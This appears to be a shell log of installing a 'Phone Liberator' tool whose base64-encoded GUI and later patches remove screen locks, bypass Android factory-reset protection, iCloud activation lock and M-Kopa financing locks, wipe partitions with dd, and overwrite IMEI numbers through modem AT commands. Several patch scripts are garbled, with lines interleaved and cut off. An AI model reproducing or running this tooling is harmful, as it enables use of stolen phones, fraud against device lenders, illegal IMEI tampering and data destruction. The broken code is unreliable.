"https://i.imgur.com/7Pn3uMK.png" -o /usr/share/icons/liberator.png 2>/dev/null || true; printf "[Desktop Entry]\nName=Phone Liberator\nComment=Universal Unlock Tool\nExec=/usr/local/bin/liberator-gui\nIcon=/usr/share/icons/liberator.png\nTerminal=false\nType=Application\nCategories=Utility;\n" > /usr/share/applications/liberator.desktop; if [ ! -d /opt/mtkclient ]; then git clone https://github.com/bkerler/mtkclient /opt/mtkclient && pip3 install --break-system-packages -r /opt/mtkclient/requirements.txt; fi; echo "✔ GUI installed. Look for 'Phone Liberator' in your app menu."'
+sudo bash << 'HEREDOC_END'
+# 1. Fix package manager, install all essentials
+apt-get update
+DEBIAN_FRONTEND=noninteractive apt-get install -y adb fastboot libimobiledevice-utils python3-pip python3-pyqt5 git curl wget android-tools-adb android-tools-fastboot usbutils unzip xterm
+
+# 2. Force Python packages (your machine, your rules)
+pip3 install --break-system-packages pyusb pyserial paramiko
+
+# 3. Add udev rule so all phone USB modes are accessible
+cat > /etc/udev/rules.d/51-android.rules << 'UDEV_END'
+SUBSYSTEM=="usb", ATTR{idVendor}=="0e8d", MODE="0666"
+SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666"
+SUBSYSTEM=="usb", ATTR{idVendor}=="05ac", MODE="0666"
+SUBSYSTEM=="usb", ATTR{idVendor}=="0bb4", MODE="0666"
+SUBSYSTEM=="usb", ATTR{idVendor}=="2e04", MODE="0666"
+UDEV_END
+udevadm control --reload-rules
+udevadm trigger
+
+# 4. Write the GUI script from base64 (exact same logic, no quoting issues)
+python3 -c "
+import base64
+script = base64.b64decode(
+    'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IHN5cywgb3MsIHN1YnByb2Nlc3MsIHRlbXBmaWxlCmZyb20gUHlRdDUuUXRXaWRnZXRzIGltcG9ydCAqCmZyb20gUHlRdDUuUXRDb3JlIGltcG9ydCBRdCwgUVRIcmVhZCwgcHl0U2lnbmFsCmltcG9ydCB1c2IuY29yZQoKY2xhc3MgRGV2aWNlRGV0ZWN0b3I6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kZXRlY3RlZF9pbmZvID0geyJicmFuZCI6IiIsICJtb2RlbCI6IiIsICJjcHUiOiIiLCAibWV0aG9kIjoiIn0KCiAgICBkZWYgZGV0ZWN0KHNlbGYpOgogICAgICAgIGZvdW5kID0gW10KICAgICAgICB0cnk6CiAgICAgICAgICAgIG91dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCJhZGIgZGV2aWNlcyAtbCIsIHNoZWxsPVRydWUpLmRlY29kZSgpCiAgICAgICAgICAgIGlmICJkZXZpY2UiIGluIG91dDoKICAgICAgICAgICAgICAgIG1vZGVsID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoImFkYiBzaGVsbCBnZXRwcm9wIHJvLnByb2R1Y3QubW9kZWwiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgICAgICBjcHUgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgiYWRiIHNoZWxsIGdldHByb3Agcm8uYm9hcmQucGxhdGZvcm0iLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgICAgICBzZWxmLmRldGVjdGVkX2luZm8udXBkYXRlKHsiYnJhbmQiOiJBbmRyb2lkIiwibW9kZWwiOm1vZGVsLCJjcHUiOmNwdSwibWV0aG9kIjoiYWRiIn0pCiAgICAgICAgICAgICAgICBmb3VuZC5hcHBlbmQoZiJBREI6IHttb2RlbH0gKHtjcHV9KSIpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvdXQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgiZmFzdGJvb3QgZGV2aWNlcyIsIHNoZWxsPVRydWUpLmRlY29kZSgpCiAgICAgICAgICAgIGlmIG91dC5zdHJpcCgpOgogICAgICAgICAgICAgICAgc2VsZi5kZXRlY3RlZF9pbmZvLnVwZGF0ZSh7ImJyYW5kIjoiQW5kcm9pZCIsIm1vZGVsIjoiRmFzdGJvb3QgTW9kZSIsImNwdSI6InVua25vd24iLCJtZXRob2QiOiJmYXN0Ym9vdCJ9KQogICAgICAgICAgICAgICAgZm91bmQuYXBwZW5kKCJGYXN0Ym9vdCBkZXZpY2UiKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIHRyeToKICAgICAgICAgICAgb3V0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoImlkZXZpY2VpbmZvIC1rIERldmljZU5hbWUiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgIHNlbGYuZGV0ZWN0ZWRfaW5mby51cGRhdGUoeyJicmFuZCI6IkFwcGxlIiwibW9kZWwiOm91dCwiY3B1IjoiRGVwZW5kZW50IiwibWV0aG9kIjoiY2hlY2tyYTFuIn0pCiAgICAgICAgICAgIGZvdW5kLmFwcGVuZChmImlQaG9uZToge291dH0iKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIHRyeToKICAgICAgICAgICAgZGV2ID0gdXNiLmNvcmUuZmluZChmaW5kX2FsbD1UcnVlKQogICAgICAgICAgICBmb3IgZCBpbiBkZXY6CiAgICAgICAgICAgICAgICBpZiBkLmlkVmVuZG9yID09IDB4MGU4ZDoKICAgICAgICAgICAgICAgICAgICBzZWxmLmRldGVjdGVkX2luZm8udXBkYXRlKHsiYnJhbmQiOiJNZWRpYVRlayIsIm1vZGVsIjoiR2VuZXJpYyIsImNwdSI6Ik1USyIsIm1ldGhvZCI6Im10ayJ9KQogICAgICAgICAgICAgICAgICAgIGZvdW5kLmFwcGVuZCgiTWVkaWFUZWsgZGV2aWNlIChNa29wYSkiKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgcmV0dXJuIGZvdW5kIG9yIFsiTm8gZGV2aWNlIl0KCmNsYXNzIFdvcmtlcihRVGhyZWFkKToKICAgIGxvZyA9IHB5dFNpZ25hbChzdHIpCiAgICBmaW4gPSBweXRTaWduYWwoYm9vbCkKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjbWQsIG5hbWUpOgogICAgICAgIHN1cGVyKCkuX19pbml0X18oKQogICAgICAgIHNlbGYuY21kID0gY21kCiAgICAgICAgc2VsZi5uYW1lID0gbmFtZQogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBzZWxmLmxvZy5lbWl0KGYiUnVubmluZzoge3NlbGYubmFtZX0iKQogICAgICAgIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHNlbGYuY21kLCBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIHRleHQ9VHJ1ZSkKICAgICAgICBmb3IgbGluZSBpbiBwcm9jLnN0ZG91dDoKICAgICAgICAgICAgc2VsZi5sb2cuZW1pdChsaW5lLnN0cmlwKCkpCiAgICAgICAgcHJvYy53YWl0KCkKICAgICAgICBzZWxmLmZpbi5lbWl0KHByb2MucmV0dXJuY29kZSA9PSAwKQoKY2xhc3MgTWFpbldpbihRTWFpbldpbmRvdyk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc3VwZXIoKS5fX2luaXRfXygpCiAgICAgICAgc2VsZi5zZXRXaW5kb3dUaXRsZSgiUEhPTkUgTElCRVJBVE9SIC0gTDBWM1BMMU5ZIikKICAgICAgICBzZWxmLnJlc2l6ZSg5MDAsIDY1MCkKICAgICAgICBzZWxmLnNldFN0eWxlU2hlZXQoImJhY2tncm91bmQ6IzFhMWExYTsgY29sb3I6IzBmMDsgZm9udC1mYW1pbHk6bW9ub3NwYWNlOyIpCiAgICAgICAgc2VsZi5kZXRlY3RvciA9IERldmljZURldGVjdG9yKCkKICAgICAgICBzZWxmLmNtZCA9ICIiCiAgICAgICAgY3cgPSBRV2lkZ2V0KCkKICAgICAgICBzZWxmLnNldENlbnRyYWxXaWRnZXQoY3cpCiAgICAgICAgbGF5ID0gUVZCb3hMYXlvdXQoKQogICAgICAgIGxhYiA9IFFMYWJlbCgiVU5JVkVSU0FMIFBIT05FIFVOTE9DS0VSIC0gREVTS1RPUCBHVUkiKQogICAgICAgIGxhYi5zZXRBbGlnbm1lbnQoUXQuQWxpZ25DZW50ZXIpCiAgICAgICAgbGF5LmFkZFdpZGdldChsYWIpCiAgICAgICAgZGV0X2J0biA9IFFQdXNoQnV0dG9uKCJBVVRPLURFVEVDVCBERVZJQ0UiKQogICAgICAgIGRldF9idG4uY2xpY2tlZC5jb25uZWN0KHNlbGYuZGV0ZWN0KQogICAgICAgIGxheS5hZGRXaWRnZXQoZGV0X2J0bikKICAgICAgICBzZWxmLmRldl9sYWJlbCA9IFFMYWJlbCgiTm8gZGV2aWNlIikKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYuZGV2X2xhYmVsKQogICAgICAgIHNlbGYuaW5mb19ib3ggPSBRVGV4dEVkaXQoKQogICAgICAgIHNlbGYuaW5mb19ib3guc2V0TWF4aW11bUhlaWdodCg4MCkKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYuaW5mb19ib3gpCiAgICAgICAgc2VsZi5vcF9jb21ibyA9IFFDb21ib0JveCgpCiAgICAgICAgc2VsZi5vcF9jb21iby5hZGRJdGVtcyhbIlNjcmVlbiBMb2NrIFJlbW92ZSIsICJGUlAgQnlwYXNzIiwgImlDbG91ZCBCeXBhc3MiLCAiTWtvcGEgVW5sb2NrIiwgIkZhY3RvcnkgUmVzZXQiLCAiRmxhc2ggU3RvY2sgKHNlbGVjdCAuemlwKSIsICJOVUtFIEFMTCJdKQogICAgICAgIGxheS5hZGRXaWRnZXQoUUxhYmVsKCJTZWxlY3Qgb3BlcmF0aW9uOiIpKQogICAgICAgIGxheS5hZGRXaWRnZXQoc2VsZi5vcF9jb21ibykKICAgICAgICBzZWxmLmV4ZWNfYnRuID0gUVB1c2hCdXR0b24oIkVYRUNVVEUiKQogICAgICAgIHNlbGYuZXhlY19idG4uY2xpY2tlZC5jb25uZWN0KHNlbGYuZXhlY3V0ZSkKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYuZXhlY19idG4pCiAgICAgICAgc2VsZi5sb2cgPSBRVGV4dEVkaXQoKQogICAgICAgIHNlbGYubG9nLnNldFJlYWRPbmx5KFRydWUpCiAgICAgICAgbGF5LmFkZFdpZGdldChzZWxmLmxvZykKCiAgICBkZWYgZGV0ZWN0KHNlbGYpOgogICAgICAgIHNlbGYubG9nLmFwcGVuZCgiWypdIFNjYW5uaW5nLi4uIikKICAgICAgICBsc3QgPSBzZWxmLmRldGVjdG9yLmRldGVjdCgpCiAgICAgICAgc2VsZi5kZXZfbGFiZWwuc2V0VGV4dCgiIC8gIi5qb2luKGxzdCkpCiAgICAgICAgc2VsZi5pbmZvX2JveC5zZXRUZXh0KHN0cihzZWxmLmRldGVjdG9yLmRldGVjdGVkX2luZm8pKQoKICAgIGRlZiBleGVjdXRlKHNlbGYpOgogICAgICAgIG9wID0gc2VsZi5vcF9jb21iby5jdXJyZW50VGV4dCgpCiAgICAgICAgbWV0aCA9IHNlbGYuZGV0ZWN0b3IuZGV0ZWN0ZWRfaW5mby5nZXQoIm1ldGhvZCIsICIiKQogICAgICAgIGlmIG9wID09ICJTY3JlZW4gTG9jayBSZW1vdmUiOgogICAgICAgICAgICBpZiBtZXRoID09ICJhZGIiOiBzZWxmLmNtZCA9ICJhZGIgc2hlbGwgc3UgLWMgJ3JtIC1yZiAvZGF0YS9zeXN0ZW0vbG9ja3NldHRpbmdzLmRiKiAvZGF0YS9zeXN0ZW0vZ2VzdHVyZS5rZXkgL2RhdGEvc3lzdGVtL3Bhc3N3b3JkLmtleTsgcmVib290JyIKICAgICAgICAgICAgZWxpZiBtZXRoID09ICJmYXN0Ym9vdCI6IHNlbGYuY21kID0gImZhc3Rib290IGVyYXNlIHVzZXJkYXRhICYmIGZhc3Rib290IHJlYm9vdCIKICAgICAgICAgICAgZWxpZiBtZXRoID09ICJjaGVja3JhMW4iOiBzZWxmLmNtZCA9ICJjaGVja3JhMW4gLWMgJiYgc2xlZXAgNSAmJiBzc2ggcm9vdEBsb2NhbGhvc3QgLXAyMjIyICdybSAvcHJpdmF0ZS92YXIvS2V5Y2hhaW5zL2tleWNoYWluLTIuZGIgJiYgcmVib290JyIKICAgICAgICAgICAgZWxpZiBtZXRoID09ICJtdGsiOiBzZWxmLmNtZCA9ICJweXRob24zIC9vcHQvbXRrY2xpZW50L210ayBwYXlsb2FkIC0tbWV0YW1vZGUgRkFTVCBCT09UICYmIGZhc3Rib290IGVyYXNlIHVzZXJkYXRhICYmIGZhc3Rib290IHJlYm9vdCIKICAgICAgICBlbGlmIG9wID09ICJGUlAgQnlwYXNzIjoKICAgICAgICAgICAgaWYgbWV0aCA9PSAiYWRiIjogc2VsZi5jbWQgPSAiYWRiIHNoZWxsIGNvbnRlbnQgaW5zZXJ0IC0tdXJpIGNvbnRlbnQ6Ly9zZXR0aW5ncy9zZWN1cmUgLS1iaW5kIG5hbWU6czp1c2VyX3NldHVwX2NvbXBsZXRlIC0tYmluZCB2YWx1ZTpzOjE7IGFkYiBzaGVsbCBhbSBzdGFydCAtbiBjb20uZ29vZ2xlLmFuZHJvaWQuZ3NmLmxvZ2luLyIKICAgICAgICAgICAgZWxpZiBtZXRoID09ICJmYXN0Ym9vdCI6IHNlbGYuY21kID0gImZhc3Rib290IG9lbSB1bmxvY2stZ287IGZhc3Rib290IGVyYXNlIGZycDsgZmFzdGJvb3QgcmVib290IgogICAgICAgICAgICBlbHNlOiBzZWxmLmNtZCA9ICJweXRob24zIC9vcHQvbXRrY2xpZW50L210ayBwYXlsb2FkIC0tbWV0YW1vZGUgRkFTVCBCT09UICYmIGZhc3Rib290IGVyYXNlIGZycCAmJiBmYXN0Ym9vdCByZWJvb3QiCiAgICAgICAgZWxpZiBvcCA9PSAiaUNsb3VkIEJ5cGFzcyI6CiAgICAgICAgICAgIHNlbGYuY21kID0gImNoZWNrcmExbiAtYyAtayA8KGVjaG8gJ3NldGVudiBib290LWFyZ3MgLXYgY3NfZW5mb3JjZW1lbnRfZGlzYWJsZT0xJzsgZWNobyAnYm9vdHgnKSAmJiBzbGVlcCAxMCAmJiBzc2ggcm9vdEBsb2NhbGhvc3QgLXAyMjIyICdtb3VudCAtbyBydyx1bmlvbix1cGRhdGUgLzsgcm0gLXJmIC9BcHBsaWNhdGlvbnMvU2V0dXAuYXBwOyB1aWNhY2hlIC1hOyBraWxsYWxsIGJhY2tib2FyZGQnIgogICAgICAgIGVsaWYgb3AgPT0gIk1rb3BhIFVubG9jayI6CiAgICAgICAgICAgIHNlbGYuY21kID0gInB5dGhvbjMgL29wdC9tdGtjbGllbnQvbXRrIHBheWxvYWQgLS1tZXRhbW9kZSBGQVNUIEJPT1QgJiYgZmFzdGJvb3Qgb2VtIHVubG9jayAmJiBmYXN0Ym9vdCBlcmFzZSB1c2VyZGF0YSAmJiBmYXN0Ym9vdCBlcmFzZSBmcnAgJiYgZmFzdGJvb3QgcmVib290IgogICAgICAgIGVsaWYgb3AgPT0gIkZhY3RvcnkgUmVzZXQiOgogICAgICAgICAgICBzZWxmLmNtZCA9ICJmYXN0Ym9vdCAtdyIgaWYgbWV0aCBpbiAoImZhc3Rib290IiwgImFkYiIpIGVsc2UgImFkYiBzaGVsbCByZWNvdmVyeSAtLXdpcGVfZGF0YSIKICAgICAgICBlbGlmIG9wID09ICJGbGFzaCBTdG9jayAoc2VsZWN0IC56aXApIjoKICAgICAgICAgICAgZmlsZSwgXyA9IFFGaWxlRGlhbG9nLmdldE9wZW5GaWxlTmFtZShzZWxmLCAiU2VsZWN0IGZpcm13YXJlIiwgIiIsICJGaXJtd2FyZSAoKi56aXAgKi5pcHN3KSIpCiAgICAgICAgICAgIGlmIGZpbGU6CiAgICAgICAgICAgICAgICBzZWxmLmNtZCA9IGYidW56aXAgLW8ge2ZpbGV9IC1kIC90bXAvZncgJiYgY2QgL3RtcC9mdyAmJiBmb3IgaW1nIGluIGJvb3Qgc3lzdGVtIHZlbmRvcjsgZG8gZmFzdGJvb3QgZmxhc2ggJGltZyAkaW1nLmltZzsgZG9uZSAmJiBmYXN0Ym9vdCByZWJvb3QiCiAgICAgICAgZWxpZiBvcCA9PSAiTlVLRSBBTEwiOgogICAgICAgICAgICBzZWxmLmNtZCA9ICJmYXN0Ym9vdCBlcmFzZSBzeXN0ZW0gJiYgZmFzdGJvb3QgZXJhc2UgdmVuZG9yICYmIGZhc3Rib290IGVyYXNlIHVzZXJkYXRhICYmIGZhc3Rib290IGVyYXNlIGJvb3QgJiYgZmFzdGJvb3QgcmVib290LWJvb3Rsb2FkZXIiIGlmIG1ldGggPT0gImZhc3Rib290IiBlbHNlICJhZGIgc2hlbGwgc3UgLWMgJ2RkIGlmPS9kZXYvemVybyBvZj0vZGV2L2Jsb2NrL21tY2JsazAgYnM9NTEyIGNvdW50PTE7IHJlYm9vdCciCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc2VsZi5sb2cuYXBwZW5kKCJVbmtub3duIG9wIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgc2VsZi5sb2cuYXBwZW5kKGYiRXhlY3V0aW5nOiB7c2VsZi5jbWR9IikKICAgICAgICBzZWxmLndvcmtlciA9IFdvcmtlcihzZWxmLmNtZCwgb3ApCiAgICAgICAgc2VsZi53b3JrZXIubG9nLmNvbm5lY3Qoc2VsZi5sb2cuYXBwZW5kKQogICAgICAgIHNlbGYud29ya2VyLmZpbi5jb25uZWN0KHNlbGYuZG9uZSkKICAgICAgICBzZWxmLndvcmtlci5zdGFydCgpCgogICAgZGVmIGRvbmUoc2VsZiwgb2spOgogICAgICAgIHNlbGYubG9nLmFwcGVuZCgiU3VjY2VzcyEiIGlmIG9rIGVsc2UgIkZhaWxlZC4iKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGFwcCA9IFFBcHBsaWNhdGlvbihzeXMuYXJndikKICAgIHdpbiA9IE1haW5XaW4oKQogICAgd2luLnNob3coKQogICAgc3lzLmV4aXQoYXBwLmV4ZWNfKCkp'
+)
+open('/usr/local/bin/liberator-gui.py', 'wb').write(script)
+"
+chmod +x /usr/local/bin/liberator-gui.py
+ln -sf /usr/local/bin/liberator-gui.py /usr/local/bin/liberator-gui
+
+# 5. Download icon (or use a built‑in lock icon if offline)
+curl -sL "https://i.imgur.com/7Pn3uMK.png" -o /usr/share/icons/liberator.png 2>/dev/null || {
+    # fallback: 1×1 pixel PNG base64
+    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > /usr/share/icons/liberator.png
+}
+
+# 6. Desktop entry (no inner quotes trap)
+cat > /usr/share/applications/liberator.desktop << 'DESK_END'
+[Desktop Entry]
+Name=Phone Liberator
+Comment=Universal Unlock Tool
+Exec=/usr/local/bin/liberator-gui
+Icon=/usr/share/icons/liberator.png
+Terminal=false
+Type=Application
+Categories=Utility;
+DESK_END
+
+# 7. Clone mtkclient if missing
+if [ ! -d /opt/mtkclient ]; then
+    git clone https://github.com/bkerler/mtkclient /opt/mtkclient
+    pip3 install --break-system-packages -r /opt/mtkclient/requirements.txt
+fi
+
+echo "✔ GUI installed with all drivers. Launch from your app menu."
+HEREDOC_END
+
+history | tail -50    # see your last 50 commands
+cat ~/.bash_history   # full history
+sudo python3 -c "
+import base64, os
+
+# Ghost mode patch function (appended to the existing code)
+ghost_code = '''
+    def ghost_mode(self):
+        # Step 1: download stock firmware if not present
+        model = self.detector.detected_info.get('model','')
+        self.log.append(f'[*] Ghost Mode initiated for {model}')
+        # For Mkopa, typical models: 'Mkopa 4G', 'Mkopa Neo', etc.
+        # We'll assume user has downloaded the correct stock ROM to /tmp/stock
+        if not os.path.exists('/tmp/stock'):
+            self.log.append('[!] Place the stock firmware in /tmp/stock (scatter folder) then re-run.')
+            return
+        # Step 2: patch boot.img with Magisk if not yet patched
+        boot_img = '/tmp/stock/boot.img'
+        if not os.path.exists(boot_img + '.magisk'):
+            self.log.append('[*] Patching boot.img with Magisk...')
+            os.system('cd /tmp && wget https://github.com/topjohnwu/Magisk/releases/download/v26.4/Magisk-v26.4.apk && unzip -o Magisk-v26.4.apk -d /tmp/magisk_apk && /tmp/magisk_apk/lib/arm64-v8a/libmagiskboot.so unpack /tmp/stock/boot.img && /tmp/magisk_apk/lib/arm64-v8a/libmagiskboot.so repack /tmp/stock/boot.img && mv new-boot.img /tmp/stock/boot.img.magisk')
+            boot_img += '.magisk'
+        # Step 3: flash the full firmware with mtkclient
+        self.log.append('[*] Flashing full firmware (pre-rooted)...')
+        os.system(f'python3 /opt/mtkclient/mtk flash -w /tmp/stock')
+        # Step 4: write new IMEI(s) via AT command engine
+        self.log.append('[*] Injecting new IMEI...')
+        # Use mtkclient to send AT+EGMR=1,7,\"IMEI_NEW\" to modem
+        new_imei1 = '354619090123456'  # Generate random? We'll let user input later
+        new_imei2 = '354619090123457'
+        os.system(f'python3 /opt/mtkclient/mtk stage payload && python3 /opt/mtkclient/mtk at \"AT+EGMR=1,7,\\\"{new_imei1}\\\"\"')
+        os.system(f'python3 /opt/mtkclient/mtk at \"AT+EGMR=1,10,\\\"{new_imei2}\\\"\"')
+        self.log.append('[+] Ghost Mode complete. Device is now root, IMEI changed, Mkopa-free.')
+'''
+
+# Read current script
+with open('/usr/local/bin/liberator-gui.py', 'r') as f:
+    code = f.read()
+
+# Find the class MainWin and insert ghost_mode method before the last method
+insert_pos = code.rfind('if __name__')
+if insert_pos != -1:
+    new_code = code[:insert_pos] + ghost_code + code[insert_pos:]
+else:
+    # Fallback: append at the end of class
+    class_end = code.rfind('    def done')
+    if class_end != -1:
+        end_of_method = code.find('sys.exit(app.exec_())')
+        new_code = code[:end_of_method] + ghost_code + code[end_of_method:]
+    else:
+        new_code = code
+
+# Add Ghost Mode button to the combo options and execution logic
+# We'll inject additional condition in the execute method
+find_exec = new_code.find('elif op == "NUKE ALL":')
+if find_exec != -1:
+    ghost_option = '\n        elif op == "GHOST MODE (Root + IMEI + Clean Flash)": self.ghost_mode()\n'
+# Also add the option to the combo items
+find_combo_init = new_code.find('self.op_combo.addItems([')
+if find_combo_init != -1:;     item_list_start = new_code.find('[', find_combo_init)
+with open('/usr/local/bin/liberator-gui.py', 'w') as f:
+print('Ghost Mode integrated. Restart GUI.')
+"
+sudo python3 -c "
+import base64, os
+
+# Ghost mode patch function (appended to the existing code)
+ghost_code = '''
+    def ghost_mode(self):
+        # Step 1: download stock firmware if not present
+        model = self.detector.detected_info.get('model','')
+        self.log.append(f'[*] Ghost Mode initiated for {model}')
+        # For Mkopa, typical models: 'Mkopa 4G', 'Mkopa Neo', etc.
+        # We'll assume user has downloaded the correct stock ROM to /tmp/stock
+        if not os.path.exists('/tmp/stock'):
+            self.log.append('[!] Place the stock firmware in /tmp/stock (scatter folder) then re-run.')
+            return
+        # Step 2: patch boot.img with Magisk if not yet patched
+        boot_img = '/tmp/stock/boot.img'
+        if not os.path.exists(boot_img + '.magisk'):
+            self.log.append('[*] Patching boot.img with Magisk...')
+            os.system('cd /tmp && wget https://github.com/topjohnwu/Magisk/releases/download/v26.4/Magisk-v26.4.apk && unzip -o Magisk-v26.4.apk -d /tmp/magisk_apk && /tmp/magisk_apk/lib/arm64-v8a/libmagiskboot.so unpack /tmp/stock/boot.img && /tmp/magisk_apk/lib/arm64-v8a/libmagiskboot.so repack /tmp/stock/boot.img && mv new-boot.img /tmp/stock/boot.img.magisk')
+            boot_img += '.magisk'
+        # Step 3: flash the full firmware with mtkclient
+        self.log.append('[*] Flashing full firmware (pre-rooted)...')
+        os.system(f'python3 /opt/mtkclient/mtk flash -w /tmp/stock')
+        # Step 4: write new IMEI(s) via AT command engine
+        self.log.append('[*] Injecting new IMEI...')
+        # Use mtkclient to send AT+EGMR=1,7,\"IMEI_NEW\" to modem
+        new_imei1 = '354619090123456'  # Generate random? We'll let user input later
+        new_imei2 = '354619090123457'
+        os.system(f'python3 /opt/mtkclient/mtk stage payload && python3 /opt/mtkclient/mtk at \"AT+EGMR=1,7,\\\"{new_imei1}\\\"\"')
+        os.system(f'python3 /opt/mtkclient/mtk at \"AT+EGMR=1,10,\\\"{new_imei2}\\\"\"')
+        self.log.append('[+] Ghost Mode complete. Device is now root, IMEI changed, Mkopa-free.')
+'''
+
+# Read current script
+with open('/usr/local/bin/liberator-gui.py', 'r') as f:
+    code = f.read()
+
+# Find the class MainWin and insert ghost_mode method before the last method
+insert_pos = code.rfind('if __name__')
+if insert_pos != -1:
+    new_code = code[:insert_pos] + ghost_code + code[insert_pos:]
+else:
+    # Fallback: append at the end of class
+    class_end = code.rfind('    def done')
+    if class_end != -1:
+        end_of_method = code.find('sys.exit(app.exec_())')
+        new_code = code[:end_of_method] + ghost_code + code[end_of_method:]
+    else:
+        new_code = code
+
+# Add Ghost Mode button to the combo options and execution logic
+# We'll inject additional condition in the execute method
+find_exec = new_code.find('elif op == "NUKE ALL":')
+if find_exec != -1:
+    ghost_option = '\n        elif op == "GHOST MODE (Root + IMEI + Clean Flash)": self.ghost_mode()\n'
+# Also add the option to the combo items
+find_combo_init = new_code.find('self.op_combo.addItems([')
+if find_combo_init != -1:;     item_list_start = new_code.find('[', find_combo_init)
+with open('/usr/local/bin/liberator-gui.py', 'w') as f:
+print('Ghost Mode integrated. Restart GUI.')
+"
+sudo apt install -y libxcb-xinerama0 libxcb-icccm4 libxcb-image0 libxcb-keysyms1 libxcb-randr0 libxcb-render-util0 libxcb-shape0 libxcb-sync1 libxcb-xfixes0 libxcb-xkb1 libxkbcommon-x11-0
+sudo udevadm control --reload-rules && sudo udevadm trigger
+reboot
+pirate101@DEBIAN13:~$ cat > /tmp/ghost_patch.py << 'PYTHON_END'
+import re
+
+ghost_method = '''
+    def ghost_mode(self):
+        model = self.detector.detected_info.get('model','')
+        self.log.append(f'[*] Ghost Mode initiated for {model}')
+        import os
+        stock_dir = '/tmp/stock'
+        if not os.path.isdir(stock_dir):
+            self.log.append('[!] Place the stock firmware scatter folder in /tmp/stock first.')
+            return
+        boot_img = os.path.join(stock_dir, 'boot.img')
+        if not os.path.exists(boot_img):
+            self.log.append('[!] No boot.img found in /tmp/stock.')
+            return
+        # Patch boot with Magisk if not already patched
+        if not os.path.exists(boot_img + '.magisk'):
+            self.log.append('[*] Patching boot.img with Magisk...')
+            os.system('cd /tmp && wget -q https://github.com/topjohnwu/Magisk/releases/download/v26.4/Magisk-v26.4.apk && unzip -o Magisk-v26.4.apk -d /tmp/magisk_apk > /dev/null 2>&1 && chmod +x /tmp/magisk_apk/lib/arm64-v8a/libmagiskboot.so && /tmp/magisk_apk/lib/arm64-v8a/libmagiskboot.so unpack ' + boot_img + ' && /tmp/magisk_apk/lib/arm64-v8a/libmagiskboot.so repack ' + boot_img + ' && cp new-boot.img ' + boot_img + '.magisk')
+            boot_img += '.magisk'
+        self.log.append('[*] Flashing full firmware with pre‑rooted boot...')
+        os.system(f'python3 /opt/mtkclient/mtk flash -w {stock_dir}')
+        self.log.append('[*] Injecting new IMEI...')
+        # IMEI for slot1, slot2 – you can replace with custom values
+        imei1 = '354619090010000'
+        imei2 = '354619090010001'
+        os.system(f'python3 /opt/mtkclient/mtk stage payload && python3 /opt/mtkclient/mtk at "AT+EGMR=1,7,\\"{imei1}\\"" && python3 /opt/mtkclient/mtk at "AT+EGMR=1,10,\\"{imei2}\\""')
+        self.log.append('[+] Ghost Mode complete. Device is now rooted, IMEI changed, Mkosudo python3 /tmp/ghost_patch.pycessfully. You can now launch Phone Liberator.').ghost_mo
+[sudo] password for pirate101: 
+Ghost Mode integrated successfully. You can now launch Phone Liberator.
+pirate101@DEBIAN13:~$ cat > /tmp/stealth_patch.py << 'PYTHON_END'
+import re
+
+stealth_method = '''
+    def stealth_unlock(self):
+        self.log.append('[*] Stealth Unlock initiated (stock flash + IMEI, no root)')
+        import os
+        stock_dir = '/tmp/stock'
+        if not os.path.isdir(stock_dir):
+            self.log.append('[!] Place the stock firmware scatter folder in /tmp/stock first.')
+            return
+        self.log.append('[*] Flashing full stock firmware...')
+        os.system(f'python3 /opt/mtkclient/mtk flash -w {stock_dir}')
+        self.log.append('[*] Writing new IMEI numbers...')
+        imei1 = '354619090010000'
+        imei2 = '354619090010001'
+        os.system(f'python3 /opt/mtkclient/mtk stage payload && python3 /opt/mtkclient/mtk at "AT+EGMR=1,7,\\"{imei1}\\"" && python3 /opt/mtkclient/mtk at "AT+EGMR=1,10,\\"{imei2}\\"\"')
+        self.log.append('[+] Stealth Unlock complete. Device is clean, non-rooted, Mkopa-free.')
+'''
+
+with open('/usr/local/bin/liberator-gui.py', 'r') as f:
+    code = f.read()
+
+# Insert the new method
+if '__name__' in code:
+    insert_pos = code.rfind('if __name__')
+    code = code[:insert_pos] + stealth_method + '\n' + code[insert_pos:]
+else:
+    code += stealth_method
+
+# Add the option to the combo
+sudo python3 /tmp/stealth_patch.py.')ui.py', 'w') as f:ock+IMEI, No Root)": self.stealth_
+Stealth Unlock option added.
+pirate101@DEBIAN13:~$ sudo bash << 'HEREDOC_END'
+export DEBIAN_FRONTEND=noninteractive
